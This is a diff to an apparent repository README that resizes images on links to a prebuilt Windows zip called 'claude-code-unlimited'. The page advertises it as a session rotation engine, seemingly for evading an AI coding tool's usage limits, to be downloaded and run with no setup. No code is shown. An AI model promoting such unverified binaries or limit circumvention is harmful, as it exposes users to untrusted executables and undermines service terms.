@@ -11,11 +11,11 @@
 
 <p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>
 
-<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-code-unlimited-v0.1.0-win64.zip" height="56"></a>
+<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-code-unlimited-v0.1.0-win64.zip" width="520"></a>
 
 <br>
 
-<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="banner_final.png" alt="Claude Code Unlimited — Session Rotation Engine Preview" width="1024"></a>
+<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="banner.svg" alt="Claude Code Unlimited — Session Rotation Engine Preview" width="840"></a>
 
 </div>
 
